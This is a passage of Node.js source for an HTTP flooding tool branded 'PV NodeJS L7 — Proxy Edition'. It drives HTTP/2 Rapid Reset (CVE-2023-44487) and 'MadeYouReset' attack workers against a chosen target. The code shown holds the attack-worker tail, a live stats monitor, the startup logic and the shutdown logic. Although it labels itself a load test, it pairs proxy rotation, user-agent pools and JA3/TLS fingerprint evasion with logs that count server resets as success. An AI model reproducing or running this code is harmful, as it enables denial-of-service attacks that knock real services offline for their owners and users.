                lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')} (Server Reset)`);
                if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
            } else {
                stats.attackErrors++;
                stats.statusCounts[0] = (stats.statusCounts[0]||0)+1;
            }
        });
        setImmediate(() => {
            if (stream.destroyed) return;
            try {
                const rw = stream.state.remoteWindowSize;
                const size = Math.min(rw+1, CONFIG.MAX_BUFFER_SIZE);
                stream.end(size > 0 ? Buffer.alloc(size) : undefined);
            } catch {
                stats.attackErrors++;
                if (!stream.destroyed) { try { stream.destroy(); } catch {} }
            }
        });
    } catch { stats.attackErrors++; }
}

// ============ MONITOR ============
function updateMonitor() {
    console.clear();
    const elapsed = (Date.now()-stats.startTime)/1000;
    const remaining = Math.max(0, (durationMs/1000)-elapsed);

    console.log(chalk.cyan('--------------------------------------------'));
    console.log(chalk.cyan.bold('      ⚡️ PV NodeJS L7 — Proxy Edition ⚡️   '));
    console.log(chalk.cyan('--------------------------------------------'));

    if (attackMode !== 'none') {
        console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        console.log(chalk.white.bold('Time: ') + chalk.yellow(formatTime(remaining)));
        console.log('');
        const name = attackMode === 'rapid-reset' ? 'Rapid Reset (CVE-2023-44487)' : 'MadeYouReset';
        console.log(chalk.bgRed.white.bold(` HTTP/2 Attack ACTIVE: ${name} `));
        console.log(chalk.white.bold('Proxies: ') + chalk.cyan(proxyAgentPool.length || 'none'));
        console.log(chalk.white.bold('Streams Sent: ') + chalk.magenta(stats.attackSent));
        console.log(chalk.white.bold('Responses: ') + chalk.magenta(stats.attackReceived));
        console.log(chalk.white.bold('Errors/Resets: ') + chalk.red((stats.statusCounts['RESET']||0)+stats.attackErrors));
    } else {
        const L = [], R = [];
        L.push(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        L.push(chalk.white.bold('Time: ') + chalk.yellow(formatTime(remaining)));
        L.push(chalk.white.bold('Proxy Pool: ') + (proxyAgentPool.length ? chalk.green(proxyAgentPool.length+' agents') : chalk.gray('disabled')));
        L.push(chalk.white.bold('UA Pool: ') + chalk.cyan(USER_AGENTS.length + ' UAs'));
        L.push(chalk.white.bold('JA3: ') + (isHttps ? (FLAGS.ja3Evasion?chalk.green('enabled'):chalk.gray('disabled')) : chalk.yellow('N/A')));
        L.push(chalk.white.bold('Protocols: ') + chalk.cyan(activeProtocols.map(p=>p.toUpperCase()).join(', ')||'auto'));

        const rps = (stats.requestsSent/elapsed||0).toFixed(2);
        const avgLat = (stats.responsesReceived>0?(stats.totalLatency/stats.responsesReceived):0).toFixed(2);
        const sr = stats.requestsSent>0?((stats.responsesReceived/stats.requestsSent)*100).toFixed(2):'0.00';
        const er = stats.requestsSent>0?((stats.errors/stats.requestsSent)*100).toFixed(2):'0.00';

        R.push(chalk.white.bold('Sent: ') + chalk.blue(stats.requestsSent));
        R.push(chalk.white.bold('Received: ') + chalk.blue(stats.responsesReceived));
        R.push(chalk.white.bold('RPS: ') + chalk.magenta(rps));
        R.push(chalk.white.bold('Avg Latency: ') + chalk.yellow(avgLat+' ms'));
        R.push(chalk.white.bold('Success: ') + chalk.green(sr+'%'));
        R.push(chalk.white.bold('Errors: ') + chalk.red(er+'%'));
        R.push(chalk.white.bold('Retries: ') + chalk.magenta(stats.retries));
        if (proxyAgentPool.length > 0) {
            R.push(chalk.white.bold('Proxy OK/Fail: ') + chalk.green(stats.proxyOk) + '/' + chalk.red(stats.proxyFail));
        }

        const maxL = Math.max(...L.map(x => stripAnsi(x).length));
        const rows = Math.max(L.length, R.length);
        for (let i = 0; i < rows; i++) {
            const l = L[i] || '', r = R[i] || '';
            console.log(l + ' '.repeat(Math.max(0, maxL - stripAnsi(l).length)) + '     ' + r);
        }
    }

    console.log('');
    console.log(chalk.white.bold('Status Counts:'));
    const statuses = attackMode !== 'none' ? stats.statusCounts : (() => {
        const agg = {};
        for (const p of activeProtocols) {
            const s = stats.protocolStats[p]?.statuses || {};
            for (const k in s) agg[k] = (agg[k]||0) + s[k];
        }
        return agg;
    })();
    const keys = Object.keys(statuses).sort();
    if (keys.length === 0) console.log(chalk.gray('  (waiting...)'));
    else keys.forEach(code => {
        const msg = HTTP_STATUS_CODES[code] || 'Unknown';
        const color = String(code).startsWith('2')?chalk.green:String(code).startsWith('3')?chalk.yellow:code==='RESET'?chalk.green:chalk.red;
        console.log(`  ${color(code)} (${msg}): ${chalk.blue(statuses[code])}`);
    });

    console.log('');
    const logs = attackMode !== 'none' ? lastAttackLogs : lastLogs;
    console.log(chalk.white.bold('Log (last 5):'));
    if (logs.length === 0) console.log(chalk.gray('  (waiting...)'));
    else logs.slice(-CONFIG.LOG_QUEUE_SIZE).forEach(l => console.log('  ' + l));

    console.log(chalk.cyan('--------------------------------------------'));
}

async function gracefulShutdown() {
    console.log(chalk.yellow('\nShutting down...'));
    isRunning = false;
    for (const conn of activeConnections) {
        try { if (conn.destroy) conn.destroy(); } catch {}
    }
    activeConnections.clear();
}

async function main() {
    console.log(chalk.green('Starting load test...'));
    console.log(chalk.yellow(`Target: ${argv.url} | Time: ${argv.time}m | Conc: ${argv.conc} | Attack: ${attackMode}`));
    console.log(chalk.cyan(`Proxies: ${proxyAgentPool.length} | UAs: ${USER_AGENTS.length}`));

    selectedTlsProfile = getRandomTlsProfile();

    if (attackMode !== 'none') {
        activeProtocols = ['h2'];
        stats.protocolStats['h2'] = { responses:0, statuses:{} };
    } else if (FLAGS.protocol) {
        const map = { '1.1':'h1', '1':'h1', '2':'h2', '3':'h3', 'h1':'h1', 'h2':'h2', 'h3':'h3' };
        activeProtocols = [...new Set(FLAGS.protocol.split(',').map(p => map[p.trim().toLowerCase()]).filter(Boolean))];
        if (activeProtocols.length === 0) throw new Error('Invalid protocol(s).');
        if (FLAGS.forceHttp3 && !activeProtocols.includes('h3')) activeProtocols.push('h3');
    } else {
        activeProtocols = FLAGS.forceHttp3 ? ['h3'] : ['h2'];
    }

    if (attackMode === 'none' && !isHttps && proxyAgentPool.length > 0) {
        console.log(chalk.yellow(`Cleartext HTTP + proxies: routed via CONNECT tunnel for h2c may fail — falling back is fine.`));
    }

    if (attackMode === 'none' && (activeProtocols.includes('h3') || FLAGS.forceHttp3)) {
        if (proxyAgentPool.length > 0) {
            console.log(chalk.yellow('H3 disabled while proxy pool is active (impers does not support this proxy path).'));
        } else {
            await loadImpers();
            console.log(chalk.cyan(impersAvailable ? 'H3 engine: impers' : 'H3 unavailable (fallback H2)'));
        }
    }

    activeProtocols.forEach(p => { stats.protocolStats[p] = { responses:0, statuses:{} }; });

    if (attackMode === 'none') {
        const counts = {};
        const n = activeProtocols.length;
        const base = Math.floor(concurrency/n);
        let rem = concurrency % n;
        activeProtocols.forEach((p,i) => counts[p] = base + (i<rem?1:0));
        console.log(chalk.cyan('Workers: ' + activeProtocols.map(p=>`${p.toUpperCase()}=${counts[p]}`).join(', ')));

        let wid = 0;
        for (const pk of activeProtocols) {
            for (let i=0;i<counts[pk];i++) runStandardWorker(wid++, pk);
        }
    } else {
        for (let i=0;i<concurrency;i++) startHttp2AttackWorker();
    }

    const mon = setInterval(updateMonitor, CONFIG.MONITOR_INTERVAL_MS);
    const to = setTimeout(async () => {
        isRunning = false;
        clearInterval(mon);
        await gracefulShutdown();
        updateMonitor();
        console.log(chalk.green.bold('\nTest finished!'));
        process.exit(0);
    }, durationMs);

    process.on('SIGINT', async () => {
        isRunning = false; clearInterval(mon); clearTimeout(to);
        await gracefulShutdown(); updateMonitor();
        console.log(chalk.red.bold('\nInterrupted.'));
        process.exit(1);
    });
    process.on('SIGTERM', async () => {
        isRunning = false; clearInterval(mon); clearTimeout(to);
        await gracefulShutdown(); updateMonitor();
        console.log(chalk.red.bold('\nTerminated.'));
        process.exit(0);
    });
}

main().catch(err => {
    console.error(chalk.red('Critical error:'), err.message);
    process.exit(1);
});